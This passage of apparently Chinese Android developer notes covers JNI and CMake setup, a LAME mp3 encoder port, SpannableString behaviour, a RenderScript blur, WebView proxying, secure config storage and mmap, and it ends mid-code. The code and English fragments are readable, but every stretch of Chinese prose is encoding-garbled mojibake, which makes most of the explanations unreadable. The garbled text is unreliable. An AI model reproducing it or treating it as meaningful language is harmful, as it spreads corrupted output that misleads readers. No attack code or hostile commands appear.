å¤šæ•°æ•™ç¨‹éƒ½æ˜¯å†™ä¸€ä¸ªgradle.propertiesæ·»åŠ ä¸€å¥android.useDeprecatedNdk=trueéšç€studioç‰ˆæœ¬å‡çº§ï¼Œè¿˜æ˜¯ä¸å¾—ä¸å‡çº§åˆ°ä½¿ç”¨cmakeçš„æ–¹å¼ã€‚ Android Studioä¸­é›†æˆcæˆ–è€…cppä»£ç ç…§ç€è¿™ä¸ªå®˜æ–¹çš„æ•™ç¨‹æŠ„å°±è¡Œäº†ã€‚å…¶å®ä¹Ÿå°±æ˜¯å†™ä¸€ä¸ªCMakeLists.txtï¼Œç„¶ååœ¨studioé‡Œé¢å³é”®appæ¨¡å—, Link C++ Project with Gradleã€‚ç…§ç€æ¥å°±æ˜¯äº†ã€‚ å…ˆå†™å¥½javaçš„nativeæ–¹æ³•ï¼Œç„¶åcdåˆ°src/main/javaè·¯å¾„javah -classpath .:/Users/harris/Library/Android/sdk/platforms/android-28/android.jar -d jni com.me.harris.ndk_graphics.JNIHelper åŠ ä¸Šclasspathçš„åŸå› æ˜¯JNIHelperè¿™ä¸ªjavaæ–‡ä»¶é‡Œé¢å¼•ç”¨åˆ°äº†Androidçš„class æŠŠç”Ÿæˆçš„headeræ–‡ä»¶å‰ªåˆ‡åˆ°å’Œmain/Javaæ–‡ä»¶å¤¹å¹³çº§çš„jniæ–‡ä»¶å¤¹ä¸­ï¼Œå†å»å†™cçš„å®ç°ã€‚ ç§»æ¤mp3lameåˆ°Androidå¹³å°ç…§ç€è¿™é‡Œæ“ä½œå°±è¡Œäº†ã€‚è¿™ç¯‡åšå®¢ä½¿ç”¨çš„æ˜¯lame-3.99.5ï¼Œæ³¨æ„ä¸‹è½½å¯¹åº”çš„ç‰ˆæœ¬ã€‚cmakeçš„ä¸€äº›çŸ¥è¯†ç‚¹cmakeç”Ÿæˆçš„.soæ–‡ä»¶åœ¨â€\\app\\build\\intermediates\\cmake\\debug\\obj\\arm64-v8aâ€è¿™ä¸ªè·¯å¾„ä¸‹ã€‚å¦å¤–ï¼ŒCMakeLists.txtæ–‡ä»¶ä¸­æ¯”å¦‚è¯´æŒ‡å®šäº†ç”Ÿæˆçš„.soæ–‡ä»¶åå­—ä¸ºxxx,é‚£ä¹ˆåœ¨è¿™ä¸ªè·¯å¾„ä¸‹æ‰¾åˆ°çš„å°†ä¼šæ˜¯libxxx.so javaè°ƒç”¨cè¯­è¨€æ€§èƒ½è¿˜å¥½,cè¯­è¨€è°ƒç”¨javaçš„æ€§èƒ½å°±æ¯”è¾ƒå·®äº†ä¸¤å¤´è°ƒæ¥è°ƒå»çš„ä¾‹å­ä¸‹é¢æ˜¯cå±‚é¢è°ƒç”¨javaä»£ç çš„ä¾‹å­ï¼Œåˆ†åˆ«æ˜¯è°ƒç”¨java instance method å’Œjava static method private String sex = &quot;female&quot;;//éœ€è¦èµ‹åˆå§‹å€¼æˆ–å®šä¹‰æˆstaticï¼Œä¸ç„¶åœ¨æ²¡æœ‰è°ƒç”¨accessPublicMethodæ–¹æ³•å‰ï¼Œè°ƒç”¨getSexæ–¹æ³•ä¼šæŠ›å¼‚å¸¸ public void setSex(String sex){ this.sex = sex; } public String getSex(){ return sex; } public native void accessPublicMethod(); //è®¿é—®javaä¸­publicæ–¹æ³• extern &quot;C&quot; void Java_com_honjane_ndkdemo_JNIUtils_accessPublicMethod( JNIEnv* env, jobject jobj){ //1.è·å¾—å®ä¾‹å¯¹åº”çš„classç±» jclass jcls = env-&gt;GetObjectClass(jobj); //2.é€šè¿‡classç±»æ‰¾åˆ°å¯¹åº”çš„method id //name ä¸ºjavaç±»ä¸­å˜é‡åï¼ŒLjava/lang/String; ä¸ºå˜é‡çš„ç±»å‹String jmethodID jmid = env-&gt;GetMethodID(jcls,&quot;setSex&quot;,&quot;(Ljava/lang/String;)V&quot;); //å®šä¹‰ä¸€ä¸ªæ€§åˆ«èµ‹å€¼ç»™javaä¸­çš„æ–¹æ³• char c[10] = &quot;male&quot;; jstring jsex = env-&gt;NewStringUTF(c); //3.é€šè¿‡objè·å¾—å¯¹åº”çš„method env-&gt;CallVoidMethod(jobj,jmid,jsex); } private static int height = 160; public static int getHeight(){ return height; } public native int accessStaticMethod(); //è®¿é—®javaä¸­staticæ–¹æ³• extern &quot;C&quot; jint Java_com_honjane_ndkdemo_JNIUtils_accessStaticMethod( JNIEnv* env, jobject jobj){ //1.è·å¾—å®ä¾‹å¯¹åº”çš„classç±» jclass jcls = env-&gt;GetObjectClass(jobj); //2.é€šè¿‡classç±»æ‰¾åˆ°å¯¹åº”çš„method id jmethodID jmid = env-&gt;GetStaticMethodID(jcls,&quot;getHeight&quot;,&quot;()I&quot;); //3.é™æ€æ–¹æ³•é€šè¿‡classè·å¾—å¯¹åº”çš„method return env-&gt;CallStaticIntMethod(jcls,jmid); } //è®¿é—®fieldç”¨çš„æ˜¯GetObjectClasså’ŒgetXXXField(è¿™é‡Œæ— è®ºæ˜¯publicè¿˜æ˜¯private fieldéƒ½èƒ½æ‹¿åˆ°) public class JNIUtils { public int num = 10; public native int addNum(); static { System.loadLibrary(&quot;native-lib&quot;); } } #include &lt;jni.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; //è®¿é—®javaå¯¹è±¡ä¸­numå±æ€§ï¼Œå¹¶å¯¹å…¶ä½œåŠ æ³•è¿ç®— extern &quot;C&quot; jint Java_com_honjane_ndkdemo_JNIUtils_addNum( JNIEnv* env, jobject jobj){ //1.è·å¾—å®ä¾‹å¯¹åº”çš„classç±» jclass jcls = env-&gt;GetObjectClass(jobj); //2.é€šè¿‡classç±»æ‰¾åˆ°å¯¹åº”çš„field id //num ä¸ºjavaç±»ä¸­å˜é‡åï¼ŒI ä¸ºå˜é‡çš„ç±»å‹int jfieldID fid = env-&gt;GetFieldID(jcls,&quot;num&quot;,&quot;I&quot;); //3.é€šè¿‡å®ä¾‹objectè·å¾—å¯¹åº”çš„field jint jnum = env-&gt;GetIntField(jobj,fid); //add jnum += 10; return jnum; } ä»jniå±‚æŠ›å‡ºä¸€ä¸ªjava Exceptionä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œå…¶å®å°±æ˜¯new ä¸€ä¸ªjava object(Exception) 1ã€å½“è°ƒç”¨ä¸€ä¸ªJNIå‡½æ•°åï¼Œå¿…é¡»å…ˆæ£€æŸ¥ã€å¤„ç†ã€æ¸…é™¤å¼‚å¸¸åå†åšå…¶å®ƒ JNI å‡½æ•°è°ƒç”¨ï¼Œå¦åˆ™ä¼šäº§ç”Ÿä¸å¯é¢„çŸ¥çš„ç»“æœã€‚2ã€ä¸€æ—¦å‘ç”Ÿå¼‚å¸¸ï¼Œç«‹å³è¿”å›ï¼Œè®©è°ƒç”¨è€…å¤„ç†è¿™ä¸ªå¼‚å¸¸ã€‚æˆ– è°ƒç”¨ ExceptionClear æ¸…é™¤å¼‚å¸¸ï¼Œç„¶åæ‰§è¡Œè‡ªå·±çš„å¼‚å¸¸å¤„ç†ä»£ç ã€‚3ã€å¼‚å¸¸å¤„ç†çš„ç›¸å…³JNIå‡½æ•°æ€»ç»“ï¼š1&gt; ExceptionCheckï¼šæ£€æŸ¥æ˜¯å¦å‘ç”Ÿäº†å¼‚å¸¸ï¼Œè‹¥æœ‰å¼‚å¸¸è¿”å›JNI_TRUEï¼Œå¦åˆ™è¿”å›JNI_FALSE2&gt; ExceptionOccurredï¼šæ£€æŸ¥æ˜¯å¦å‘ç”Ÿäº†å¼‚å¸¸ï¼Œè‹¥ç”¨å¼‚å¸¸è¿”å›è¯¥å¼‚å¸¸çš„å¼•ç”¨ï¼Œå¦åˆ™è¿”å›NULL3&gt; ExceptionDescribeï¼šæ‰“å°å¼‚å¸¸çš„å †æ ˆä¿¡æ¯4&gt; ExceptionClearï¼šæ¸…é™¤å¼‚å¸¸å †æ ˆä¿¡æ¯5&gt; ThrowNewï¼šåœ¨å½“å‰çº¿ç¨‹è§¦å‘ä¸€ä¸ªå¼‚å¸¸ï¼Œå¹¶è‡ªå®šä¹‰è¾“å‡ºå¼‚å¸¸ä¿¡æ¯jint (JNICALL ThrowNew) (JNIEnv env, jclass clazz, const char msg);6&gt; Throwï¼šä¸¢å¼ƒä¸€ä¸ªç°æœ‰çš„å¼‚å¸¸å¯¹è±¡ï¼Œåœ¨å½“å‰çº¿ç¨‹è§¦å‘ä¸€ä¸ªæ–°çš„å¼‚å¸¸jint (JNICALL Throw) (JNIEnv env, jthrowable obj);7&gt; FatalErrorï¼šè‡´å‘½å¼‚å¸¸ï¼Œç”¨äºè¾“å‡ºä¸€ä¸ªå¼‚å¸¸ä¿¡æ¯ï¼Œå¹¶ç»ˆæ­¢å½“å‰VMå®ä¾‹ï¼ˆå³é€€å‡ºç¨‹åºï¼‰void (JNICALL FatalError) (JNIEnv env, const char msg); jniæ˜¯ä¸€å¥—è§„èŒƒ,oracleæœ‰ä¸€ä¸ªæ–‡æ¡£ï¼Œä¸åŒçš„vmç…§ç€è¿™ä¸ªè§„èŒƒå®ç°å°±æ˜¯äº† å…³äºSpannable Stringçš„é—®é¢˜Mediumä¸Šæœ‰å…³äºä½¿ç”¨spançš„æ–‡ç«  Spantastic text styling with Spans å…¶å®æœ‰SpannableString(mutable),SpannableStringBuilderè¿˜æœ‰SpannedString(immutable)ã€‚Just reading and not setting the text nor the spans? -&gt; SpannedString(æ–‡å­—å’Œstyleéƒ½æ”¹ä¸äº†)Setting the text and the spans? -&gt; SpannableStringBuilder(æ–‡å­—å’ŒStyleéƒ½èƒ½æ”¹)Setting a small number of spans (&lt;~10)? -&gt; SpannableString(æ–‡å­—ä¸èƒ½æ”¹ï¼ŒStyleèƒ½æ”¹)Setting a larger number of spans (&gt;~10) -&gt; SpannableStringBuilder stackoverflowä¸Šç”šè‡³æœ‰Glideä½œè€…çš„è®¨è®ºä»æºç æ¥çœ‹,SpannedStringå’ŒSpannableStringå‡ ä¹æ˜¯ä¸€æ ·çš„ï¼Œåè€…ç»§æ‰¿äº†ä¸€ä¸ªSpannableçš„æ¥å£ï¼Œç”±æ­¤å¯¹å¤–æš´éœ²äº†çˆ¶ç±»(SpannableStringInternal)çš„setSpanå’ŒremoveSpanæ–¹æ³•ã€‚ Use a SpannedString when your text has style but you donâ€™t need to change either the text or the style after it is created. (ä¼¼ä¹å¹³æ—¶ä¹Ÿåº”è¯¥è¿™æ ·ä½¿ç”¨ï¼Œä½†ä»æºç æ¥çœ‹ï¼Œä¸¤è€…å‡ ä¹æ²¡æœ‰æ€§èƒ½ä¸Šçš„åŒºåˆ«ã€‚çœŸæ­£çš„æ€§èƒ½å·®å¼‚è¦å–å†³äºå®é™…çš„use case)Use a SpannableString when your text doesnâ€™t need to be changed but the styling does.Use a SpannableStringBuilder when you will need to update the text and its style. SPAN_EXCLUSIVE_EXCLUSIVEï¼ŒSPAN_EXCLUSIVE_INCLUSIVEè¿™äº›ä¸œè¥¿çš„æ„æ€æ˜¯é’ˆå¯¹æ–°çš„æ–‡å­—æ’å…¥ä¹‹åçš„è¡Œä¸ºæ¥è¯´çš„ã€‚SPAN_EXCLUSIVE_INCLUSIVEå°±æ˜¯è¯´æ–°çš„æ–‡å­—æ’å…¥ä¹‹åï¼Œä¹‹å‰è®¾ç½®çš„spanå°†è‡ªåŠ¨æ‰©å¢å¹¶åº”ç”¨åˆ°è¿™æ®µæ–°çš„æ–‡å­—ä¸Šã€‚ spannable.setSpan( ForegroundColorSpan(Color.RED), /* start index */ 8, /* end index */ 12, Spannable.SPAN_EXCLUSIVE_INCLUSIVE) spannable.insert(12, â€œ(&amp; fon)â€) //æ³¨æ„SpannableStringBuilderçš„è¿™ä¸ªinsertæ–¹æ³•æ˜¯å¯ä»¥æŒ‡å®šinsertçš„ä½ç½®çš„ val spannable = SpannableString(â€œText is spantastic!â€) spannable.setSpan( ForegroundColorSpan(Color.RED), 8, 12, Spannable.SPAN_EXCLUSIVE_EXCLUSIVE) spannable.setSpan( StyleSpan(BOLD), 8, spannable.length, Spannable.SPAN_EXCLUSIVE_EXCLUSIVE) //ä¸€æ®µæ–‡å­—å¯ä»¥åŒæ—¶åº”ç”¨å¤šä¸ªSpannableæ ·å¼ Frameworkè‡ªå¸¦çš„spanså¯ä»¥åˆ†ä¸ºä¸¤ç±»ï¼šä¸€ç§æ˜¯æ”¹å˜æ–‡å­—å¤–è§‚çš„ï¼ˆAppearance affecting spanï¼‰ï¼Œå¦ä¸€ç§æ˜¯æ”¹å˜æ–‡å­—å¤§å°çš„(Metric affecting span)ã€‚ æ–‡ç« é‡Œè¿˜æåˆ°äº†å¯ä»¥ä½¿ç”¨TextView.setText(Spannable, BufferType.SPANNABLE)æ–¹æ³•ï¼Œå¦‚æœåç»­éœ€è¦ä¿®æ”¹æ–‡å­—çš„spanæ ·å¼çš„è¯ï¼Œå¯ä»¥getTextï¼Œè·å¾—çš„æ˜¯ä¹‹å‰è®¾ç½®çš„spanï¼Œè¿™æ—¶å€™å†å»å¯¹è¿™ä¸ªspanè¿›è¡Œæ“ä½œï¼ˆä¸è¦å†setTextå›å»äº†ï¼‰ï¼Œè¿™å¯¹æå‡æ€§èƒ½æœ‰å¸®åŠ©ï¼ˆtextçš„measureå’Œlayoutéƒ½æ˜¯è€—æ€§èƒ½çš„æ“ä½œï¼‰ã€‚ä½†æ³¨æ„ï¼Œå¦‚æœæ˜¯ä½¿ç”¨äº†RelativeSizeSpançš„è¯ï¼Œå› ä¸ºæ›´æ”¹äº†TextViewçš„å¤§å°ï¼Œè¿™å¿…ç„¶ä¼šè§¦å‘é‡æ–°measureå’Œlayoutï¼Œä¸Šè¿°çš„ä¼˜åŒ–ä¼¼ä¹ä¹Ÿå°±æ²¡æœ‰å¿…è¦äº†ã€‚ è‡ªå®šä¹‰Spançš„è¯ï¼šAffecting text at the character level -&gt; CharacterStyleAffecting text at the paragraph level -&gt; ParagraphStyleAffecting text appearance -&gt; UpdateAppearanceAffecting text metrics -&gt; UpdateLayout assetæ–‡ä»¶å¤¹é‡Œé¢çš„ä¸œè¥¿æ˜¯æ— æ³•ç”¨Fileçš„å½¢å¼å»è·å–çš„android.os.FileUriExposedException: file://assets/dist/index.js exposed beyond app through Intent.getData()at android.os.StrictMode.onFileUriExposed(StrictMode.java:1816) 15. setClipToOutline(v21)åœ†è§’çŸ©å½¢çš„å®ç°å¤šäº†ä¸€ç§é€‰æ‹© gradle build scan[æŠŠä¸€äº›æœ¬åœ°libiaryæ‰“åŒ…æˆaarèƒ½å¤Ÿæ˜¾è‘—åŠ å¿«ç¼–è¯‘] AAPT2ä¼šç”Ÿæˆä¸€å †.flatæ–‡ä»¶ å…¨è§’åŠè§’å¯¹æ±‰å­—æ²¡æœ‰å½±å“TextViewæœ‰æ—¶å€™ä¼šå‡ºç°æå‰æ¢è¡Œçš„é—®é¢˜,è¿™äº‹æ®è¯´è·Ÿå…¨è§’åŠè§’æœ‰å…³ï¼ˆå…¨è§’çŠ¶æ€ä¸‹å­—æ¯ã€æ•°å­—ç¬¦å·ç­‰éƒ½ä¼šå ä¸¤ä¸ªå­—èŠ‚çš„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªæ±‰å­—é‚£ä¹ˆå®½ï¼ŒåŠè§’çŠ¶æ€ä¸‹ï¼Œå­—æ¯æ•°å­—ç¬¦å·ä¸€èˆ¬ä¼šå ä¸€ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯åŠä¸ªæ±‰å­—çš„ä½ç½®ï¼Œå…¨è§’åŠè§’å¯¹æ±‰å­—æ²¡æœ‰å½±å“ã€‚ï¼‰ä¸€ä¸ªç›´è§‚çš„è¡¨ç°æ˜¯å…¨è§’çš„æƒ…å†µä¸‹ä½ å‘ç°å†’å·ï¼Œåˆ†å·è¿™äº›ä¸œè¥¿éƒ½å˜å¾—æ¯”è¾ƒå®½ã€‚ï¼ˆ;ï¼›Mï¼­ï¼‰ä¹Ÿå°±æ˜¯æ‰€è°“çš„ä¸­æ–‡æ ‡ç‚¹ç¬¦å· .å¯¹äº†ï¼Œå…¨è§’çš„æƒ…å†µä¸‹å­—æ¯ï¼Œæ•°å­—ä¹Ÿä¼šå˜å®½ä¸€ç‚¹ï¼ˆæœ¬è´¨ä¸Šæ˜¯å ç”¨ä¸¤ä¸ªå­—ç¬¦ï¼‰ [Instagramæ˜¯å¦‚ä½•æå‡TextViewæ¸²æŸ“æ€§èƒ½çš„(http://codethink.me/2015/04/23/improving-comment-rendering-on-android/),å…³é”®å­—TextLayoutCachecompile ffmpeg for androidéœ€è¦ä¿®æ”¹B0 -&gt; b0 ï¼Œlinuxå¹³å°æˆ–è€…macå¹³å°å¯ç”¨compile ffmpeg for android Andoridå¹³å°ä¸Šé»˜è®¤çš„isLoggableçš„å…è®¸çš„LogLevelæ˜¯infoï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œlog.då’Œlog.væ˜¯ä¸ä¼šæ˜¾ç¤ºçš„ã€‚wht are log-d and log-v not printingå½“ç„¶è¿™ä¹Ÿè¦çœ‹æ‰‹æœºå‚å•†è®¾ç½®ï¼Œé­…æ—æ‰‹æœºå°±æ˜¯è®¾ç½®ä¸ºinfoçº§åˆ«åŠä»¥ä¸Šäº†ã€‚è¿™è¯2016å¹´æœ‰äººæé†’è¿‡æˆ‘ã€‚ 16.lamemp3 ç§»æ¤åˆ°androidå¹³å°lameç‰ˆæœ¬3.99.5 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;jni.h&gt; #include &lt;android/log.h&gt; #include &quot;libmp3lame/lame.h&quot; #define LOG_TAG &quot;LAME ENCODER&quot; #define LOGD(format, args...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, format, ##args); #define BUFFER_SIZE 8192 #define be_short(s) ((short) ((unsigned short) (s) &lt;&lt; 8) | ((unsigned short) (s) &gt;&gt; 8)) lame_t lame; int read_samples(FILE *input_file, short *input) { int nb_read; nb_read = fread(input, 1, sizeof(short), input_file) / sizeof(short); int i = 0; while (i &lt; nb_read) { input[i] = be_short(input[i]); i++; } return nb_read; } void Java_com_example_core_audio_NativeRecorder_initEncoder(JNIEnv *env, jobject jobj, jint in_num_channels, jint in_samplerate, jint in_brate, jint in_mode, jint in_quality) { lame = lame_init(); // LOGD(&quot;Init parameters:&quot;); lame_set_num_channels(lame, in_num_channels); // LOGD(&quot;Number of channels: %d&quot;, in_num_channels); lame_set_in_samplerate(lame, in_samplerate); // LOGD(&quot;Sample rate: %d&quot;, in_samplerate); lame_set_brate(lame, in_brate); // LOGD(&quot;Bitrate: %d&quot;, in_brate); lame_set_mode(lame, in_mode); // LOGD(&quot;Mode: %d&quot;, in_mode); lame_set_quality(lame, in_quality); // LOGD(&quot;Quality: %d&quot;, in_quality); int res = lame_init_params(lame); // LOGD(&quot;Init returned: %d&quot;, res); } void Java_com_example_core_audio_NativeRecorder_destroyEncoder( JNIEnv *env, jobject jobj) { int res = lame_close(lame); // LOGD(&quot;Deinit returned: %d&quot;, res); } void Java_com_example_core_audio_NativeRecorder_encodeFile(JNIEnv *env, jobject jobj, jstring in_source_path, jstring in_target_path) { const char *source_path, *target_path; source_path = (*env)-&gt;GetStringUTFChars(env, in_source_path, NULL); target_path = (*env)-&gt;GetStringUTFChars(env, in_target_path, NULL); FILE *input_file, *output_file; input_file = fopen(source_path, &quot;rb&quot;); output_file = fopen(target_path, &quot;wb&quot;); short input[BUFFER_SIZE]; char output[BUFFER_SIZE]; int nb_read = 0; int nb_write = 0; int nb_total = 0; // LOGD(&quot;Encoding started&quot;); while (nb_read = read_samples(input_file, input)) { nb_write = lame_encode_buffer(lame, input, input, nb_read, output, BUFFER_SIZE); fwrite(output, nb_write, 1, output_file); nb_total += nb_write; } // LOGD(&quot;Encoded %d bytes&quot;, nb_total); nb_write = lame_encode_flush(lame, output, BUFFER_SIZE); fwrite(output, nb_write, 1, output_file); // LOGD(&quot;Flushed %d bytes&quot;, nb_write); fclose(input_file); fclose(output_file); } 17. Androidå¹³å°ä¸Šnativeçš„crashå…¶å®æ˜¯å¯ä»¥catchçš„Chromium çš„Breakpadæ˜¯ç›®å‰ Native å´©æºƒæ•è·ä¸­æœ€æˆç†Ÿçš„æ–¹æ¡ˆ 18. bitmap 4096Bitmap too large to be uploaded into a texture (9425x1920, max=8192x8192)4096è¿˜æ˜¯8192è¿™ä¸ªæ•°å€¼ä¸ç¡®å®š,stackoverflowä¸Šçš„å›ç­”æ•™ä¼šå¦‚ä½•æŸ¥ int[] maxSize = new int[1]; gl.glGetIntegerv(GL10.GL_MAX_TEXTURE_SIZE, maxSize, 0); Log.e(&quot;GL&quot;, &quot;CURRENT MAX IS &quot;+String.valueOf(maxSize[0])); // maxSize[0] now contains max size(in both dimensions) 19. RenderScriptçš„ä½¿ç”¨æ–¹å¼é«˜æ–¯æ¨¡ç³Š //é¦–å…ˆä»ä¸€ä¸ªviewä¸­è·å–Bitmap,åœ¨çˆ¶viewgroupä¸­addView(ImageView),setImageBItmap(blurredBitmap) public static Bitmap getViewBitmap(View v) { if(v.getWidth() == 0 || v.getHeight() == 0) return null; Bitmap b = Bitmap.createBitmap( v.getWidth(), v.getHeight(), Bitmap.Config.ARGB_8888); Canvas c = new Canvas(b); v.draw(c); return b; } public Bitmap blurBitmap(Bitmap bitmap){ //Let&#39;s create an empty bitmap with the same size of the bitmap we want to blur Bitmap outBitmap = Bitmap.createBitmap(bitmap.getWidth(), bitmap.getHeight(), Config.ARGB_8888); //Instantiate a new Renderscript RenderScript rs = RenderScript.create(getApplicationContext()); //Create an Intrinsic Blur Script using the Renderscript ScriptIntrinsicBlur blurScript = ScriptIntrinsicBlur.create(rs, Element.U8_4(rs)); //Create the Allocations (in/out) with the Renderscript and the in/out bitmaps Allocation allIn = Allocation.createFromBitmap(rs, bitmap); Allocation allOut = Allocation.createFromBitmap(rs, outBitmap); //Set the radius of the blur: 0 &lt; radius &lt;= 25 blurScript.setRadius(25.0f); //Perform the Renderscript blurScript.setInput(allIn); blurScript.forEach(allOut); //Copy the final bitmap created by the out Allocation to the outBitmap allOut.copyTo(outBitmap); //recycle the original bitmap bitmap.recycle(); //After finishing everything, we destroy the Renderscript. rs.destroy(); return outBitmap; } 20. webViewæ˜¯å¯ä»¥è®¾ç½®ä»£ç†çš„åœ¨Androidä¸­webViewæ˜¯å¯ä»¥é€šè¿‡åå°„çš„æ–¹å¼ä¸ºwebViewè®¾ç½®ä»£ç†çš„å‚è€ƒã€‚è˜‘è‡è¡—åœ¨å¤„ç†ç³»ç»Ÿ WebView è¯·æ±‚çš„æ—¶å€™ï¼Œä¸ºç³»ç»Ÿçš„ WebView è®¾ç½®ä»£ç†ï¼Œå°†è¯·æ±‚å‘é€è‡³æœ¬åœ°ç«¯å£ã€‚åŒæ—¶åœ¨ç½‘ç»œåº“ä¸­å®ç°äº†ä¸€ä¸ª Http Proxy Serverï¼Œèƒ½è½¬å‘æ‰€ç›‘å¬ç«¯å£çš„ httpï¼Œhttps è¯·æ±‚ï¼Œæ‰€æœ‰æ¥æ”¶åˆ°çš„ httpï¼Œhttps è¯·æ±‚ï¼Œå¯ä»¥ç»è¿‡è‡ªå·±çš„ç½‘ç»œåº“è½¬å‘å‡ºå»ï¼Œè¿™æ ·æ‰€æœ‰è‡ªæœ‰ç½‘ç»œåº“çš„ä¿®æ”¹ï¼Œä¼˜åŒ–éƒ½å¯ä»¥ç”Ÿæ•ˆã€‚ 21.Androidä¸Šæ•æ„Ÿä¿¡æ¯å­˜å‚¨æœ¬åœ°åº”è¯¥å­˜åœ¨å“ªé‡Œåœ¨shadowsocks-androidä¸­çœ‹åˆ°è¿™æ ·ä¸€æ®µæºç ,å¤–åŠ è¿™æ ·ä¸€æ®µæ³¨é‡Šè¯´configæ–‡ä»¶å±äºæ•æ„Ÿä¿¡æ¯ï¼Œè¦ä¹ˆåŠ å¯†ä¿å­˜ï¼Œè¦ä¹ˆå­˜åœ¨è®¾å¤‡å­˜å‚¨ä¸­ /** * Sensitive shadowsocks configuration file requires extra protection. It may be stored in encrypted storage or * device storage, depending on which is currently available. */ val configRoot = (if (Build.VERSION.SDK_INT &lt; 24 || app.getSystemService&lt;UserManager&gt;() ?.isUserUnlocked != false) app else Core.deviceStorage).noBackupFilesDir val configFile = File(configRoot, &quot;shadowsocks.conf&quot;) isUserUnlockedï¼ˆadded in api 24ï¼‰ Return whether the calling user is running in an â€œunlockedâ€ state.On devices with direct boot, a user is unlocked only after theyâ€™ve entered their credentials (such as a lock pattern or PIN). On devices without direct boot, a user is unlocked as soon as it starts.When a user is locked, only device-protected data storage is available. When a user is unlocked, both device-protected and credential-protected private app data storage is available. æ‰€ä»¥ä¸Šé¢çš„æ–‡ä»¶è·¯å¾„åœ¨api 24æˆ–è€…userUnlockedï¼ˆå·²ç»è§£é”ï¼‰çš„æƒ…å†µä¸‹ï¼Œç”¨çš„æ˜¯Application.noBackupFilesDir,å¦åˆ™ç”¨çš„æ˜¯context.createDeviceProtectedStorageContext()åˆ›å»ºå‡ºæ¥çš„ä¸€ä¸ªcontext(ä¹Ÿå°±æ˜¯åœ¨24ä»¥ä¸Š)ã€‚noBackupFilesDirçš„æ„æ€åªæ˜¯ä¸ä¼šè¢«è‡ªåŠ¨åŒæ­¥ï¼Œè¿™ç§æ•æ„Ÿä¿¡æ¯å½“ç„¶ä¸åº”è¯¥è¢«åŒæ­¥ã€‚ è‡³äºå®‰å…¨æ€§ï¼ŒgetFilesDir()è¿™ç§è¿”å›çš„å±äºinternal Storageã€‚æ ¹æ®Commonswareçš„è§£é‡Šçš„è§£é‡Šï¼Œè¿™ä¸ªä½ç½®çš„æ–‡ä»¶åªæœ‰å½“å‰appï¼ˆæˆ–è€…æœ‰rootæƒé™çš„appï¼‰èƒ½å¤Ÿè¯»æˆ–è€…å†™ï¼Œå…¶ä»–çš„appä¸€å¾‹denyã€‚æ‰€ä»¥å¦‚æœä¸è€ƒè™‘rootçš„æƒ…å†µä¸‹ï¼Œè¿™ä¸ªä½ç½®å…¶å®æ˜¯å¾ˆå®‰å…¨çš„ã€‚ android:sharedUserIdè¿™ä¸ªå±æ€§å¯ä»¥è®©ä¸¤ä¸ªappå…±äº«getFilesDir()ä¸‹é¢çš„æ–‡ä»¶ï¼ˆå‰ææ˜¯signing keyç›¸åŒï¼‰ï¼Œäº‹å®ä¸Šè¿™äº›æ–‡ä»¶çš„owneréƒ½æ˜¯åŒä¸€ä¸ªlinux userã€‚æœ€åæä¸€ä¸‹è¿™ä¸ªç›®å½•çš„ä½ç½® File f=new File(&quot;/data/data/their.app.package.name/files/foo.txt&quot;); File f=new File(getFilesDir(), &quot;foo.txt&quot;); their.app.package.nameè¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹é¢æœ‰å‡ ä¸ªç›®å½•cache,shared_prefsâ€¦ 22. åœ¨Androidä¸Šä½¿ç”¨mmapç­‰linuxé€šä¿¡æ‰‹æ®µ åœ¨æ•°æ®è®¿é—®ä¸­ï¼Œå†…å­˜çš„è®¿é—®é€Ÿåº¦è‚¯å®šæ˜¯æœ€å¿«çš„ï¼Œæ‰€ä»¥å¯¹äºæœ‰äº›æ–‡ä»¶éœ€è¦é¢‘ç¹é«˜æ•ˆè®¿é—®çš„æ—¶å€™å°±å¯ä»¥è€ƒè™‘ä½¿ç”¨å†…å­˜æ˜ å°„è¿›è¡Œç›´æ¥è¯»å†™æ“ä½œï¼Œä»£æ›¿IOè¯»å†™ï¼Œè¾¾åˆ°æ›´é«˜çš„æ•ˆç‡ã€‚ Androidç®€å•å†…å­˜æ˜ å°„ä¸è®¿é—® Linuxæä¾›äº†å†…å­˜æ˜ å°„å‡½æ•°mmap, å®ƒæŠŠæ–‡ä»¶å†…å®¹æ˜ å°„åˆ°ä¸€æ®µå†…å­˜ä¸Š(å‡†ç¡®è¯´æ˜¯è™šæ‹Ÿå†…å­˜ä¸Š), é€šè¿‡å¯¹è¿™æ®µå†…å­˜çš„è¯»å–å’Œä¿®æ”¹, å®ç°å¯¹æ–‡ä»¶çš„è¯»å–å’Œä¿®æ”¹,mmap()ç³»ç»Ÿè°ƒç”¨ä½¿å¾—è¿›ç¨‹ä¹‹é—´å¯ä»¥é€šè¿‡æ˜ å°„ä¸€ä¸ªæ™®é€šçš„æ–‡ä»¶å®ç°å…±äº«å†…å­˜ã€‚æ™®é€šæ–‡ä»¶æ˜ å°„åˆ°è¿›ç¨‹åœ°å€ç©ºé—´åï¼Œè¿›ç¨‹å¯ä»¥å‘è®¿é—®å†…å­˜çš„æ–¹å¼å¯¹æ–‡ä»¶è¿›è¡Œè®¿é—®ï¼Œä¸éœ€è¦å…¶ä»–ç³»ç»Ÿè°ƒç”¨(read,write)å»æ“ä½œã€‚ è¿›ç¨‹å´©æºƒæ—¶ï¼Œmmapçš„å†…å­˜å†…æ ¸æ˜¯ä¼šå¸®ä½ å†™å›åˆ°ç£ç›˜çš„ å½“ç„¶å¯ä»¥è‡ªå·±å†™jniæ‰“æˆsoæ–‡ä»¶ï¼Œåªæ˜¯jdkå·²ç»æä¾›äº†å†™å¥½çš„jniï¼ˆå…¶å®MappedByteBufferå°±æ˜¯ç®€å•çš„ä¸€å±‚cè¯­è¨€mmapåŒ…è£¹ï¼‰ï¼Œæ²¡å¿…è¦è‡ªå·±å†™ private MappedByteBuffer memoryMap = null; private void initMemoryMap() { if (memoryMap == null) { RandomAccessFile raf = null; try { // å’Œå‰é¢c++æ˜ å°„çš„æ–‡ä»¶åä¸€è‡´ã€‚ raf = new RandomAccessFile(&quot;/tmp/memory_map&quot;, &quot;rw&quot;); FileChannel fc = raf.getChannel(); memoryMap = fc.map(FileChannel.MapMode.READ_WRITE, 0, 16); } catch 